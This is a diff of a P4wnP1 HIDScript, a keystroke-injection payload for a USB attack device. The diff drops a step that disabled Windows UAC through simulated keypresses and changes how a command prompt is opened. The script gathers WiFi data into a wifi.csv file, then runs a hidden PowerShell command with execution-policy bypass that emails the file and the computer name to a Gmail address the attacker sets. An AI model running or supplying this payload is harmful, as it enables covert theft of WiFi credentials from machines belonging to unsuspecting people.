@@ -1,46 +1,21 @@
-//P4wnP1 HiDscript - Disable UAC, then gather WiFi data and email it.
-//Change line 50 and 68 ('Desktop') to location you want file saved
-//Change line 68 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
-//Change line 85 to set location file was saved
+//P4wnP1 HiDscript - Gather WiFi data and email it.
+//Change line 25 and 45 ('Desktop') to location you want file saved
+//Change line 43 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
+//Change line 65 to set location file was saved
   
 layout('us');			// US keyboard layout
 typingSpeed(0,0)	// Type Fast
-  
-//Disable UAC
-delay(500);
-press('GUI D');
-delay(500);
-press('GUI');
-delay(300);
-type("uac");
-delay(100);
-press('ENTER');
-delay(500);
-press('ALT Y');
-delay(300);
-press('TAB');
-delay(300);
-press('DOWN');
-delay(300);
-press('DOWN');
-delay(300);
-press('DOWN');
-delay(300);
-press('TAB');
-delay(100);
-press('ENTER');
-delay(500);
-press('ALT Y');
-delay(100);
 
 //Gather Wifi data & save file
 delay(500);
 press('GUI D');
 delay(500);
-press('GUI X');
+press('GUI R');
 delay(500);
-press('A');
-delay(800);
+type('cmd');
+delay(300);
+press('ENTER');
+delay(1000);
 type("MODE 15,1");
 press('ENTER');
 delay(100);
@@ -55,10 +30,12 @@ delay(500);
 delay(500);
 press('GUI D');
 delay(500);
-press('GUI X');
+press('GUI R');
 delay(500);
-press('A');
-delay(800);
+type('cmd');
+delay(300);
+press('ENTER');
+delay(1000);
 type("MODE 15,1");
 press('ENTER');
 delay(100);
@@ -67,21 +44,24 @@ press('ENTER');
 delay(100);
 type("powershell -NoP -NonI -W Hidden -Exec Bypass $DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL'; $ReportEmail.To.Add('RECEIVER_EMAIL'); $ReportEmail.Subject = 'P4wnP1 WiFi Report'; $ReportEmail.Body = 'Attached is your report from ' + $env:computername + '. - Regards Your P4wnP1'; $ReportEmail.Attachments.Add($DesktopPath + '\\wifi.csv'); $SMTPInfo.Send($ReportEmail)");
 press('ENTER');
+
+
+//Change to file location
 delay(500);
 press('GUI D');
 delay(500);
-press('GUI X');
+press('GUI R');
+delay(1000);
+type('cmd');
+delay(300);
+press('ENTER');
 delay(500);
-press('A');
-delay(800);
 type("MODE 15,1");
 press('ENTER');
 delay(100);
 type("COLOR EF");
 press('ENTER');
 delay(100);
-
-//Change to file location
 type("cd %UserProfile%\\Desktop");
 press('ENTER');
 delay(100);
